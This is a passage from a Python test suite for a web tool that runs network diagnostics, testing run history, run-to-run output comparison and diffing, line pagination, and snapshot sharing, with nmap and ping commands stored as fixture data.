            assert [r["command"] for r in data["runs"]] == ["curl recent fail"]

            resp = client.get(
                "/history?exit_code=-15&date_range=24h",
                headers={"X-Session-ID": session},
            )
            data = json.loads(resp.data)
            assert [r["command"] for r in data["runs"]] == ["ping stopped"]
        finally:
            conn = sqlite3.connect(DB_PATH)
            conn.executemany("DELETE FROM runs WHERE id = ?", [(run_id,) for run_id in run_ids])
            conn.commit()
            conn.close()

    def test_active_history_returns_running_runs_for_this_session(self):
        client = get_client()
        session = f"session-{uuid.uuid4()}"
        active_runs = [
            {
                "run_id": "run-1",
                "command": "ping darklab.sh",
                "started": "2026-01-01T00:00:00Z",
            }
        ]

        with mock.patch("blueprints.history.active_runs_for_session", return_value=active_runs) as active_mock:
            resp = client.get(
                "/history/active",
                headers={"X-Session-ID": session, "X-Client-ID": "client-1"},
            )

        assert resp.status_code == 200
        assert json.loads(resp.data) == {"runs": active_runs}
        active_mock.assert_called_once_with(session, client_id="client-1")

    def test_compare_candidates_rank_exact_command_before_same_target(self):
        client = get_client()
        session = "compare-candidates-" + uuid.uuid4().hex[:8]
        rows = [
            (
                "cmp-source",
                session,
                "nmap -sV darklab.sh",
                "2026-01-01T00:00:04",
                "2026-01-01T00:00:06",
                0,
                "[]",
            ),
            (
                "cmp-exact",
                session,
                "nmap -sV darklab.sh",
                "2026-01-01T00:00:03",
                "2026-01-01T00:00:05",
                0,
                "[]",
            ),
            (
                "cmp-target",
                session,
                "nmap -Pn darklab.sh",
                "2026-01-01T00:00:02",
                "2026-01-01T00:00:04",
                0,
                "[]",
            ),
            (
                "cmp-root",
                session,
                "nmap scanme.nmap.org",
                "2026-01-01T00:00:01",
                "2026-01-01T00:00:03",
                0,
                "[]",
            ),
        ]
        try:
            conn = sqlite3.connect(DB_PATH)
            conn.executemany(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
                "VALUES (?, ?, ?, ?, ?, ?, ?)",
                rows,
            )
            conn.commit()
            conn.close()

            resp = client.get(
                "/history/cmp-source/compare-candidates",
                headers={"X-Session-ID": session},
            )
            data = json.loads(resp.data)

            assert resp.status_code == 200
            assert [item["id"] for item in data["candidates"][:3]] == [
                "cmp-exact",
                "cmp-target",
                "cmp-root",
            ]
            assert data["candidates"][0]["confidence"] == "exact_command"
            assert data["candidates"][1]["confidence"] == "same_target"
            assert data["candidates"][2]["confidence"] == "same_command"
        finally:
            conn = sqlite3.connect(DB_PATH)
            conn.execute("DELETE FROM runs WHERE session_id = ?", (session,))
            conn.commit()
            conn.close()

    def test_hunk_line_diff_handles_insert_delete_and_equal_context(self):
        entries = lambda values: [  # noqa: E731 - compact test fixture builder
            {"text": value, "line_index": index} for index, value in enumerate(values)
        ]
        diff = run_comparison.hunk_line_diff(
            entries(["same", "service old"]),
            entries(["same", "service new", "extra"]),
            inline_context=1,
        )

        assert diff["totals"] == {
            "left_total_lines": 2,
            "right_total_lines": 3,
            "equal_line_count": 1,
            "changed_line_count": 1,
            "added_line_count": 1,
            "removed_line_count": 0,
        }
        assert [hunk["op"] for hunk in diff["hunks"]] == ["equal", "replace"]
        assert diff["hunks"][0]["left"]["lines"][0]["text"] == "same"
        assert diff["hunks"][1]["right"]["lines"][diff["hunks"][1]["right_unpaired"][0]]["text"] == "extra"
        buckets = run_comparison.density_buckets_for_hunks(diff["hunks"], bucket_count=4)
        assert len(buckets) == 4
        assert sum(
            bucket["equal"] + bucket["added"] + bucket["removed"] + bucket["changed"]
            for bucket in buckets
        ) == 3
        assert buckets[-1]["end"] == 3
        assert run_comparison.density_bucket_tone({
            "equal": 3, "added": 1, "removed": 0, "changed": 1,
        }) == "changed"
        assert run_comparison.density_bucket_tone({
            "equal": 3, "added": 2, "removed": 1, "changed": 0,
        }) == "added"
        assert run_comparison.density_bucket_tone({
            "equal": 3, "added": 2, "removed": 2, "changed": 0,
        }) == "removed"
        empty_buckets = run_comparison.density_buckets_for_hunks([], bucket_count=4)
        assert len(empty_buckets) == 4
        assert all(bucket == {
            "start": 0, "end": 0, "equal": 0, "added": 0, "removed": 0, "changed": 0,
        } for bucket in empty_buckets)

        long_equal = run_comparison.hunk_line_diff(
            entries(["a", "b", "c", "d", "e", "old"]),
            entries(["a", "b", "c", "d", "e", "new"]),
            inline_context=2,
        )
        equal_hunk = long_equal["hunks"][0]
        assert equal_hunk["op"] == "equal"
        assert "lines" not in equal_hunk["left"]
        assert [item["text"] for item in equal_hunk["context"]["leading"]["left"]] == ["a", "b"]
        assert [item["text"] for item in equal_hunk["context"]["trailing"]["right"]] == ["d", "e"]
        assert equal_hunk["context"]["omitted"] == 1

    def test_hunk_line_diff_handles_uneven_replace_pairing(self):
        entries = lambda values: [  # noqa: E731 - compact test fixture builder
            {"text": value, "line_index": index} for index, value in enumerate(values)
        ]
        diff = run_comparison.hunk_line_diff(
            entries([
                "alpha service open",
                "beta service open",
                "left-only value",
            ]),
            entries([
                "alpha service closed",
                "beta service closed",
            ]),
        )

        hunk = diff["hunks"][0]
        assert hunk["op"] == "replace"
        assert [(item["left_index"], item["right_index"]) for item in hunk["changed_pairs"]] == [(0, 0), (1, 1)]
        assert hunk["left_unpaired"] == [2]
        assert hunk["right_unpaired"] == []
        assert diff["totals"]["changed_line_count"] == 2
        assert diff["totals"]["removed_line_count"] == 1
        assert any(
            segment["changed"]
            for segment in hunk["changed_pairs"][0]["segments"]["left"]
        )

    def test_hunk_line_diff_keeps_unrelated_and_long_replace_lines_unpaired(self):
        unrelated = run_comparison.hunk_line_diff(
            [
                {"text": "left aaa", "line_index": 0},
                {"text": "left bbb", "line_index": 1},
            ],
            [
                {"text": "right yyy", "line_index": 0},
                {"text": "right zzz", "line_index": 1},
            ],
            max_changed_lines=10,
        )
        unrelated_hunk = unrelated["hunks"][0]
        assert unrelated_hunk["changed_pairs"] == []
        assert unrelated_hunk["left_unpaired"] == [0, 1]
        assert unrelated_hunk["right_unpaired"] == [0, 1]

        long_left = "scanner " + ("a" * run_comparison.COMPARE_LINE_DISPLAY_TRUNCATE) + " old"
        long_right = "scanner " + ("a" * run_comparison.COMPARE_LINE_DISPLAY_TRUNCATE) + " new"
        long_diff = run_comparison.hunk_line_diff(
            [{"text": long_left, "line_index": 0}],
            [{"text": long_right, "line_index": 0}],
        )
        long_hunk = long_diff["hunks"][0]
        assert long_hunk["changed_pairs"] == []
        assert long_hunk["left_unpaired"] == [0]
        assert long_hunk["right_unpaired"] == [0]

    def test_replace_pairing_uses_quick_ratio_before_full_ratio(self, monkeypatch):
        calls = {"quick_ratio": 0, "ratio": 0}

        class CheapRejectMatcher:
            def __init__(self, *_args, **_kwargs):
                pass

            def quick_ratio(self):
                calls["quick_ratio"] += 1
                return 0.1

            def ratio(self):
                calls["ratio"] += 1
                return 1.0

        monkeypatch.setattr(run_comparison, "SequenceMatcher", CheapRejectMatcher)
        hunk = run_comparison.compare_replace_hunk(
            [
                {"text": "left alpha", "line_index": 0},
                {"text": "left beta", "line_index": 1},
            ],
            [
                {"text": "right gamma", "line_index": 0},
                {"text": "right delta", "line_index": 1},
            ],
            0,
            2,
            0,
            2,
        )

        assert hunk["changed_pairs"] == []
        assert hunk["left_unpaired"] == [0, 1]
        assert hunk["right_unpaired"] == [0, 1]
        assert calls["quick_ratio"] > 0
        assert calls["ratio"] == 0

    def test_hunk_line_diff_preserves_one_to_one_replace_pairing_below_threshold(self):
        diff = run_comparison.hunk_line_diff(
            [{"text": "abcde", "line_index": 0}],
            [{"text": "vwxyz", "line_index": 0}],
        )

        hunk = diff["hunks"][0]
        assert hunk["op"] == "replace"
        assert [(item["left_index"], item["right_index"]) for item in hunk["changed_pairs"]] == [(0, 0)]
        assert hunk["left_unpaired"] == []
        assert hunk["right_unpaired"] == []

    def test_hunk_line_diff_reports_budget_exhaustion(self):
        entries = lambda prefix, count: [  # noqa: E731 - compact test fixture builder
            {"text": f"{prefix}-{index}", "line_index": index} for index in range(count)
        ]
        line_limited = run_comparison.hunk_line_diff(
            entries("left", 4),
            entries("right", 4),
            max_changed_lines=3,
            max_hunks=10,
        )

        assert line_limited["truncated"]["lines_omitted"]["total"] == 5
        assert line_limited["truncated"]["hunks_omitted"] == 0
        hunk = line_limited["hunks"][0]
        assert hunk["lines_omitted"]["total"] == 5
        assert run_comparison.change_hunk_units(hunk) == 3
        assert line_limited["totals"]["changed_line_count"] == len(hunk["changed_pairs"])
        assert line_limited["totals"]["removed_line_count"] == len(hunk["left_unpaired"])
        assert line_limited["totals"]["added_line_count"] == len(hunk["right_unpaired"])

        hunk_limited = run_comparison.hunk_line_diff(
            [
                {"text": "a", "line_index": 0},
                {"text": "same", "line_index": 1},
                {"text": "b", "line_index": 2},
            ],
            [
                {"text": "c", "line_index": 0},
                {"text": "same", "line_index": 1},
                {"text": "d", "line_index": 2},
            ],
            max_changed_lines=10,
            max_hunks=1,
        )
        assert hunk_limited["truncated"]["hunks_omitted"] == 1
        assert hunk_limited["truncated"]["lines_omitted"] == {
            "left": 1,
            "right": 1,
            "total": 2,
        }
        assert hunk_limited["totals"]["changed_line_count"] == 1
        assert hunk_limited["totals"]["removed_line_count"] == 0
        assert hunk_limited["totals"]["added_line_count"] == 0

        line_cap_exhausted = run_comparison.hunk_line_diff(
            [
                {"text": "a", "line_index": 0},
                {"text": "same", "line_index": 1},
                {"text": "b", "line_index": 2},
            ],
            [
                {"text": "c", "line_index": 0},
                {"text": "same", "line_index": 1},
                {"text": "d", "line_index": 2},
            ],
            max_changed_lines=2,
            max_hunks=10,
        )
        assert line_cap_exhausted["truncated"]["hunks_omitted"] == 1
        assert line_cap_exhausted["truncated"]["lines_omitted"] == {
            "left": 1,
            "right": 1,
            "total": 2,
        }
        assert line_cap_exhausted["totals"]["changed_line_count"] == 1
        assert line_cap_exhausted["totals"]["removed_line_count"] == 0
        assert line_cap_exhausted["totals"]["added_line_count"] == 0

    def test_compare_history_lines_returns_filtered_output_slices(self):
        client = get_client()
        session = "compare-lines-" + uuid.uuid4().hex[:8]
        output = json.dumps([
            {"text": "anon@darklab:/ $ nmap darklab.sh", "cls": "prompt-echo"},
            {"text": "alpha", "cls": "", "line_index": 0},
            {"text": "beta", "cls": "", "line_index": 1},
            {"text": "gamma", "cls": "", "line_index": 2},
            {"text": "[process exited with code 0]", "cls": "exit-ok"},
        ])
        try:
            conn = sqlite3.connect(DB_PATH)
            conn.executemany(
                "INSERT INTO runs (id, session_id, command, started, output_preview, output_line_count) "
                "VALUES (?, ?, 'nmap darklab.sh', datetime('now'), ?, 3)",
                [
                    ("cmp-lines-left", session, output),
                    ("cmp-lines-right", session, output),
                ],
            )
            conn.commit()
            conn.close()

            resp = client.get(
                "/history/compare/lines?left=cmp-lines-left&right=cmp-lines-right"
                "&side=a&start=1&end=3",
                headers={"X-Session-ID": session},
            )
            data = json.loads(resp.data)

            assert resp.status_code == 200
            assert data["start"] == 1
            assert data["end"] == 3
            assert data["truncated"] is False
            assert [item["text"] for item in data["lines"]] == ["beta", "gamma"]
            assert data["lines"][0]["line_index"] == 1
        finally:
            conn = sqlite3.connect(DB_PATH)
            conn.execute("DELETE FROM runs WHERE session_id = ?", (session,))
            conn.commit()
            conn.close()

    def test_compare_history_lines_rejects_invalid_ranges_and_clamps_stale_ranges(self):
        client = get_client()
        session = "compare-lines-invalid-" + uuid.uuid4().hex[:8]
        other_session = "compare-lines-other-" + uuid.uuid4().hex[:8]
        output = json.dumps([{"text": "alpha", "cls": "", "line_index": 0}])
        try:
            conn = sqlite3.connect(DB_PATH)
            conn.executemany(
                "INSERT INTO runs (id, session_id, command, started, output_preview, output_line_count) "
                "VALUES (?, ?, 'nmap darklab.sh', datetime('now'), ?, 1)",
                [
                    ("cmp-lines-invalid-left", session, output),
                    ("cmp-lines-invalid-right", session, output),
                    ("cmp-lines-invalid-other", other_session, output),
                ],
            )
            conn.commit()
            conn.close()

            invalid_side = client.get(
                "/history/compare/lines?left=cmp-lines-invalid-left&right=cmp-lines-invalid-right"
                "&side=x&start=0&end=1",
                headers={"X-Session-ID": session},
            )
            out_of_range = client.get(
                "/history/compare/lines?left=cmp-lines-invalid-left&right=cmp-lines-invalid-right"
                "&side=a&start=0&end=2",
                headers={"X-Session-ID": session},
            )
            stale_start = client.get(
                "/history/compare/lines?left=cmp-lines-invalid-left&right=cmp-lines-invalid-right"
                "&side=a&start=2&end=4",
                headers={"X-Session-ID": session},
            )
            cross_session = client.get(
                "/history/compare/lines?left=cmp-lines-invalid-left&right=cmp-lines-invalid-other"
                "&side=a&start=0&end=1",
                headers={"X-Session-ID": session},
            )

            assert invalid_side.status_code == 400
            assert out_of_range.status_code == 200
            out_of_range_payload = json.loads(out_of_range.data)
            assert [item["text"] for item in out_of_range_payload["lines"]] == ["alpha"]
            assert out_of_range_payload["end"] == 1
            assert out_of_range_payload["truncated"] is True
            assert out_of_range_payload["range_clamped"] is True
            assert "requested range exceeded" in out_of_range_payload["note"]
            assert stale_start.status_code == 200
            stale_start_payload = json.loads(stale_start.data)
            assert stale_start_payload["lines"] == []
            assert stale_start_payload["start"] == 1
            assert stale_start_payload["end"] == 1
            assert stale_start_payload["truncated"] is True
            assert stale_start_payload["range_clamped"] is True
            assert cross_session.status_code == 404
        finally:
            conn = sqlite3.connect(DB_PATH)
            conn.execute("DELETE FROM runs WHERE session_id IN (?, ?)", (session, other_session))
            conn.commit()
            conn.close()

    def test_compare_history_lines_paginates_by_line_and_byte_limits(self):
        client = get_client()
        session = "compare-lines-limit-" + uuid.uuid4().hex[:8]
        output = json.dumps([
            {"text": "aaaa", "cls": "", "line_index": 0},
            {"text": "bbbb", "cls": "", "line_index": 1},
            {"text": "cccc", "cls": "", "line_index": 2},
        ])
        try:
            conn = sqlite3.connect(DB_PATH)
            conn.executemany(
                "INSERT INTO runs (id, session_id, command, started, output_preview, output_line_count) "
                "VALUES (?, ?, 'nmap darklab.sh', datetime('now'), ?, 3)",
                [
                    ("cmp-lines-limit-left", session, output),
                    ("cmp-lines-limit-right", session, output),
                ],
            )
            conn.commit()
            conn.close()

            with mock.patch("services.runs.comparison.COMPARE_LAZY_EQUAL_PAGE_LIMIT", 2):
                line_limited = client.get(
                    "/history/compare/lines?left=cmp-lines-limit-left&right=cmp-lines-limit-right"
                    "&side=a&start=0&end=3",
                    headers={"X-Session-ID": session},
                )
            line_data = json.loads(line_limited.data)
            assert line_limited.status_code == 200
            assert [item["text"] for item in line_data["lines"]] == ["aaaa", "bbbb"]
            assert line_data["end"] == 2
            assert line_data["truncated"] is True
            assert line_data["page_limit"] == 2

            with mock.patch("services.runs.comparison.COMPARE_LAZY_EQUAL_BYTE_LIMIT", 5):
                byte_limited = client.get(
                    "/history/compare/lines?left=cmp-lines-limit-left&right=cmp-lines-limit-right"
                    "&side=a&start=0&end=3",
                    headers={"X-Session-ID": session},
                )
            byte_data = json.loads(byte_limited.data)
            assert byte_limited.status_code == 200
            assert [item["text"] for item in byte_data["lines"]] == ["aaaa"]
            assert byte_data["end"] == 1
            assert byte_data["truncated"] is True
            assert byte_data["byte_limit"] == 5

            with mock.patch("services.runs.comparison.COMPARE_LAZY_EQUAL_BYTE_LIMIT", 3):
                oversized_line = client.get(
                    "/history/compare/lines?left=cmp-lines-limit-left&right=cmp-lines-limit-right"
                    "&side=a&start=0&end=3",
                    headers={"X-Session-ID": session},
                )
            oversized_data = json.loads(oversized_line.data)
            assert oversized_line.status_code == 200
            assert [item["text"] for item in oversized_data["lines"]] == ["aaaa"]
            assert oversized_data["end"] == 1
            assert oversized_data["truncated"] is True
            assert oversized_data["byte_limit"] == 3
        finally:
            conn = sqlite3.connect(DB_PATH)
            conn.execute("DELETE FROM runs WHERE session_id = ?", (session,))
            conn.commit()
            conn.close()

    def test_compare_history_runs_returns_metadata_and_changed_lines(self):
        client = get_client()
        session = "compare-runs-" + uuid.uuid4().hex[:8]
        left_output = json.dumps([
            {"text": "anon@darklab:/ $ nmap darklab.sh", "cls": "prompt-echo"},
            {"text": "Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-30 23:22 UTC", "cls": ""},
            {"text": "80/tcp open http", "cls": "", "signals": ["findings"], "line_index": 0},
            {"text": "8080/tcp open http-proxy", "cls": "", "signals": ["findings"], "line_index": 1},
            {"text": "[process exited with code 0]", "cls": "exit-ok"},
        ])
        right_output = json.dumps([
            {"text": "anon@darklab:/ $ nmap darklab.sh", "cls": "prompt-echo"},
            {"text": "Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-30 23:21 UTC", "cls": ""},
            {"text": "80/tcp open http", "cls": "", "signals": ["findings"], "line_index": 0},
            {"text": "443/tcp open https", "cls": "", "signals": ["findings"], "line_index": 1},
            {"text": "[process exited with code 0]", "cls": "exit-ok"},
        ])
        try:
            conn = sqlite3.connect(DB_PATH)
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, "
                "output_preview, output_line_count) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                (
                    "cmp-left",
                    session,
                    "nmap darklab.sh",
                    "2026-01-01T00:00:01",
                    "2026-01-01T00:00:03",
                    0,
                    left_output,
                    4,
                ),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, "
                "output_preview, output_line_count) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                (
                    "cmp-right",
                    session,
                    "nmap darklab.sh",
                    "2026-01-01T00:00:04",
                    "2026-01-01T00:00:09",
                    0,
                    right_output,
                    4,
                ),
            )
            conn.execute(
                "INSERT INTO findings "
                "(id, session_id, run_id, scope, title, raw_line, line_number, fingerprint, created) "
                "VALUES (?, ?, ?, 'finding', 'open port 8080', '8080/tcp open http-proxy', 1, ?, datetime('now'))",
                ("cmp-finding-left", session, "cmp-left", "cmp-fp-left"),
            )
            conn.execute(
                "INSERT INTO findings "
                "(id, session_id, run_id, scope, title, raw_line, line_number, fingerprint, created) "
                "VALUES (?, ?, ?, 'finding', 'open port 443', '443/tcp open https', 1, ?, datetime('now'))",
                ("cmp-finding-right", session, "cmp-right", "cmp-fp-right"),
            )
            conn.execute(
                "INSERT INTO run_file_artifacts "
                "(id, session_id, run_id, workspace_path, display_name, kind, byte_size, detected_by, created) "
                "VALUES (?, ?, ?, 'reports/left.txt', 'left.txt', 'output', 10, 'workspace_flag', datetime('now'))",
                ("cmp-artifact-left", session, "cmp-left"),
            )
            conn.execute(
                "INSERT INTO run_file_artifacts "
                "(id, session_id, run_id, workspace_path, display_name, kind, byte_size, detected_by, created) "
                "VALUES (?, ?, ?, 'reports/right.txt', 'right.txt', 'output', 12, 'workspace_flag', datetime('now'))",
                ("cmp-artifact-right", session, "cmp-right"),
            )
            conn.commit()
            conn.close()

            resp = client.get(
                "/history/compare?left=cmp-left&right=cmp-right",
                headers={"X-Session-ID": session},
            )
            data = json.loads(resp.data)

            assert resp.status_code == 200
            assert data["left"]["command"] == "nmap darklab.sh"
            assert data["right"]["duration_seconds"] == 5
            assert data["deltas"]["duration_seconds"]["delta"] == 3
            assert data["deltas"]["findings"]["delta"] == 0
            assert data["totals"] == {
                "left_total_lines": 3,
                "right_total_lines": 3,
                "equal_line_count": 1,
                "changed_line_count": 2,
                "added_line_count": 0,
                "removed_line_count": 0,
            }
            assert [hunk["op"] for hunk in data["hunks"]] == ["replace", "equal", "replace"]
            assert data["limits"]["max_changed_lines"] == 2000
            assert data["limits"]["minimap_buckets"] == 256
            assert len(data["density_buckets"]) == 256
            assert sum(
                bucket["equal"] + bucket["added"] + bucket["removed"] + bucket["changed"]
                for bucket in data["density_buckets"]
            ) == (
                data["totals"]["equal_line_count"]
                + data["totals"]["changed_line_count"]
                + data["totals"]["added_line_count"]
                + data["totals"]["removed_line_count"]
            )
            assert "sections" not in data
            first_hunk = data["hunks"][0]
            first_pair = first_hunk["changed_pairs"][0]
            first_left = first_hunk["left"]["lines"][first_pair["left_index"]]
            first_right = first_hunk["right"]["lines"][first_pair["right_index"]]
            assert first_left["text"].endswith("23:22 UTC")
            assert first_right["text"].endswith("23:21 UTC")
            assert any(segment["changed"] for segment in first_pair["segments"]["left"])
            assert any(segment["changed"] for segment in first_pair["segments"]["right"])
            final_hunk = data["hunks"][2]
            final_pair = final_hunk["changed_pairs"][0]
            final_left = final_hunk["left"]["lines"][final_pair["left_index"]]
            final_right = final_hunk["right"]["lines"][final_pair["right_index"]]
            assert final_left["text"] == "8080/tcp open http-proxy"
            assert final_right["text"] == "443/tcp open https"
            hunk_texts = []
            for hunk in data["hunks"]:
                hunk_texts.extend(
                    line["text"] for line in hunk.get("left", {}).get("lines", [])
                )
                hunk_texts.extend(
                    line["text"] for line in hunk.get("right", {}).get("lines", [])
                )
            assert all("process exited" not in text for text in hunk_texts)
            assert [item["raw_line"] for item in data["objects"]["findings"]["added"]] == ["443/tcp open https"]
            assert [item["raw_line"] for item in data["objects"]["findings"]["removed"]] == ["8080/tcp open http-proxy"]
            assert data["objects"]["findings"]["added"][0]["line_number"] == 1
            assert data["objects"]["findings"]["added"][0]["compare_line_index"] == 2
            assert data["objects"]["findings"]["removed"][0]["line_number"] == 1
            assert data["objects"]["findings"]["removed"][0]["compare_line_index"] == 2
            assert [item["workspace_path"] for item in data["objects"]["artifacts"]["added"]] == ["reports/right.txt"]
            assert [item["workspace_path"] for item in data["objects"]["artifacts"]["removed"]] == ["reports/left.txt"]
            assert "compare_line_index" not in data["objects"]["artifacts"]["added"][0]

            with mock.patch("services.runs.comparison.MAX_COMPARE_ITEMS_PER_SIDE", 0):
                capped_resp = client.get(
                    "/history/compare?left=cmp-left&right=cmp-right",
                    headers={"X-Session-ID": session},
                )
            capped = json.loads(capped_resp.data)
            assert capped_resp.status_code == 200
            assert capped["left"]["persisted_finding_count"] == 1
            assert capped["right"]["persisted_finding_count"] == 1
            assert capped["left"]["artifact_count"] == 1
            assert capped["right"]["artifact_count"] == 1
            assert capped["objects"]["findings"] == {"added": [], "removed": [], "unchanged_count": 0}
            assert capped["objects"]["artifacts"] == {"added": [], "removed": [], "unchanged_count": 0}
            assert capped["truncated"]["findings"] == {"left": True, "right": True}
            assert capped["truncated"]["artifacts"] == {"left": True, "right": True}
            assert capped["truncated"]["item_limit"] == 0

            with mock.patch("services.runs.comparison.COMPARE_MAX_CHANGED_LINES", 2):
                line_limited_resp = client.get(
                    "/history/compare?left=cmp-left&right=cmp-right",
                    headers={"X-Session-ID": session},
                )
            line_limited = json.loads(line_limited_resp.data)
            assert line_limited_resp.status_code == 200
            assert line_limited["truncated"]["changed_lines"] is True
            assert line_limited["truncated"]["hunks_omitted"] == 1
            assert line_limited["truncated"]["lines_omitted"] == {
                "left": 1,
                "right": 1,
                "total": 2,
            }
            assert line_limited["totals"]["changed_line_count"] == 1
            assert line_limited["totals"]["added_line_count"] == 0
            assert line_limited["totals"]["removed_line_count"] == 0
        finally:
            conn = sqlite3.connect(DB_PATH)
            conn.execute("DELETE FROM findings WHERE session_id = ?", (session,))
            conn.execute("DELETE FROM run_file_artifacts WHERE session_id = ?", (session,))
            conn.execute("DELETE FROM runs WHERE session_id = ?", (session,))
            conn.commit()
            conn.close()

    def test_compare_history_runs_handles_invalid_requests_and_identical_runs(self):
        client = get_client()
        session = "compare-errors-" + uuid.uuid4().hex[:8]
        output = json.dumps([
            {"text": "same header", "cls": "", "line_index": 0},
            {"text": "80/tcp open http", "cls": "", "line_index": 1},
        ])
        try:
            conn = sqlite3.connect(DB_PATH)
            conn.executemany(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, "
                "output_preview, output_line_count) VALUES (?, ?, 'nmap darklab.sh', ?, ?, 0, ?, 2)",
                [
                    ("cmp-errors-left", session, "2026-01-01T00:00:01", "2026-01-01T00:00:03", output),
                    ("cmp-errors-right", session, "2026-01-01T00:00:04", "2026-01-01T00:00:06", output),
                ],
            )
            conn.commit()
            conn.close()

            missing_left = client.get(
                "/history/compare?right=cmp-errors-right",
                headers={"X-Session-ID": session},
            )
            missing_right = client.get(
                "/history/compare?left=cmp-errors-left",
                headers={"X-Session-ID": session},
            )
            same_run = client.get(
                "/history/compare?left=cmp-errors-left&right=cmp-errors-left",
                headers={"X-Session-ID": session},
            )
            missing_run = client.get(
                "/history/compare?left=cmp-errors-left&right=missing-run",
                headers={"X-Session-ID": session},
            )
            identical = client.get(
                "/history/compare?left=cmp-errors-left&right=cmp-errors-right",
                headers={"X-Session-ID": session},
            )

            assert missing_left.status_code == 400
            assert missing_right.status_code == 400
            assert same_run.status_code == 400
            assert missing_run.status_code == 404
            assert identical.status_code == 200
            identical_payload = json.loads(identical.data)
            assert identical_payload["totals"]["changed_line_count"] == 0
            assert identical_payload["totals"]["added_line_count"] == 0
            assert identical_payload["totals"]["removed_line_count"] == 0
            assert identical_payload["objects"]["findings"] == {
                "added": [],
                "removed": [],
                "unchanged_count": 0,
            }
            assert identical_payload["objects"]["artifacts"] == {
                "added": [],
                "removed": [],
                "unchanged_count": 0,
            }
            assert identical_payload["truncated"]["changed_lines"] is False
        finally:
            conn = sqlite3.connect(DB_PATH)
            conn.execute("DELETE FROM runs WHERE session_id = ?", (session,))
            conn.commit()
            conn.close()

    def test_compare_history_runs_matches_findings_by_normalized_text_not_order_or_fingerprint(self):
        client = get_client()
        session = "compare-findings-order-" + uuid.uuid4().hex[:8]
        try:
            conn = sqlite3.connect(DB_PATH)
            conn.executemany(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, "
                "output_preview, output_line_count) VALUES (?, ?, ?, ?, ?, 0, '[]', 0)",
                [
                    ("cmp-findings-left", session, "nmap darklab.sh", "2026-01-01T00:00:01", "2026-01-01T00:00:03"),
                    ("cmp-findings-right", session, "nmap darklab.sh", "2026-01-01T00:00:04", "2026-01-01T00:00:06"),
                ],
            )
            conn.executemany(
                "INSERT INTO findings "
                "(id, session_id, run_id, scope, title, raw_line, line_number, fingerprint, created) "
                "VALUES (?, ?, ?, 'finding', ?, ?, ?, ?, datetime('now'))",
                [
                    (
                        "cmp-finding-left-80",
                        session,
                        "cmp-findings-left",
                        "80/tcp open http",
                        "80/tcp open http",
                        0,
                        "left-fingerprint-80",
                    ),
                    (
                        "cmp-finding-left-443",
                        session,
                        "cmp-findings-left",
                        "443/tcp open https",
                        "443/tcp open https",
                        1,
                        "left-fingerprint-443",
                    ),
                    (
                        "cmp-finding-right-443",
                        session,
                        "cmp-findings-right",
                        "443/tcp open https",
                        "\x1b[32m443/tcp   open   https\x1b[0m",
                        0,
                        "right-fingerprint-443",
                    ),
                    (
                        "cmp-finding-right-80",
                        session,
                        "cmp-findings-right",
                        "80/tcp open http",
                        "80/tcp open http",
                        1,
                        "right-fingerprint-80",
                    ),
                ],
            )
            conn.commit()
            conn.close()

            resp = client.get(
                "/history/compare?left=cmp-findings-left&right=cmp-findings-right",
                headers={"X-Session-ID": session},
            )
            data = json.loads(resp.data)

            assert resp.status_code == 200
            assert data["objects"]["findings"]["added"] == []
            assert data["objects"]["findings"]["removed"] == []
            assert data["objects"]["findings"]["unchanged_count"] == 2
        finally:
            conn = sqlite3.connect(DB_PATH)
            conn.execute("DELETE FROM findings WHERE session_id = ?", (session,))
            conn.execute("DELETE FROM runs WHERE session_id = ?", (session,))
            conn.commit()
            conn.close()

    def test_compare_history_runs_leaves_very_long_lines_unpaired(self):
        client = get_client()
        session = "compare-long-lines-" + uuid.uuid4().hex[:8]
        left_line = "scanner output " + ("a" * 4500) + " old"
        right_line = "scanner output " + ("a" * 4500) + " new"
        try:
            conn = sqlite3.connect(DB_PATH)
            conn.executemany(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, "
                "output_preview, output_line_count) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                [
                    (
                        "cmp-long-left",
                        session,
                        "nmap darklab.sh",
                        "2026-01-01T00:00:01",
                        "2026-01-01T00:00:03",
                        0,
                        json.dumps([{"text": left_line, "cls": "", "line_index": 0}]),
                        1,
                    ),
                    (
                        "cmp-long-right",
                        session,
                        "nmap darklab.sh",
                        "2026-01-01T00:00:04",
                        "2026-01-01T00:00:09",
                        0,
                        json.dumps([{"text": right_line, "cls": "", "line_index": 0}]),
                        1,
                    ),
                ],
            )
            conn.commit()
            conn.close()

            resp = client.get(
                "/history/compare?left=cmp-long-left&right=cmp-long-right",
                headers={"X-Session-ID": session},
            )
            data = json.loads(resp.data)

            assert resp.status_code == 200
            assert data["hunks"][0]["op"] == "replace"
            assert data["hunks"][0]["changed_pairs"] == []
            assert data["hunks"][0]["left_unpaired"] == [0]
            assert data["hunks"][0]["right_unpaired"] == [0]
            assert "sections" not in data
            left_unpaired = [
                data["hunks"][0]["left"]["lines"][index]["text"]
                for index in data["hunks"][0]["left_unpaired"]
            ]
            right_unpaired = [
                data["hunks"][0]["right"]["lines"][index]["text"]
                for index in data["hunks"][0]["right_unpaired"]
            ]
            assert left_unpaired == [left_line]
            assert right_unpaired == [right_line]
        finally:
            conn = sqlite3.connect(DB_PATH)
            conn.execute("DELETE FROM runs WHERE session_id = ?", (session,))
            conn.commit()
            conn.close()


# ── /share ────────────────────────────────────────────────────────────────────

class TestShareRoute:
    def test_post_creates_snapshot(self):
        client = get_client()
        resp = client.post(
            "/share",
            json={"label": "test snapshot", "content": ["line1", "line2"]},
            headers={"X-Session-ID": "test-session"}
        )
        assert resp.status_code == 200
        data = json.loads(resp.data)
        assert "id" in data
        assert "url" in data

    def test_post_can_offload_large_snapshot_content_and_restore_it(self):
        from services.storage import body_store

        client = get_client()
        session_id = "share-offload-" + uuid.uuid4().hex[:8]
        content = [{"text": "line " + ("x" * 64), "cls": "notice"}]
        with tempfile.TemporaryDirectory() as tmp, \
             mock.patch.object(body_store, "DATA_DIR", tmp), \
             mock.patch.dict("config.CFG", {"snapshots_inline_max_bytes": 1}):
            create_resp = client.post(
                "/share",
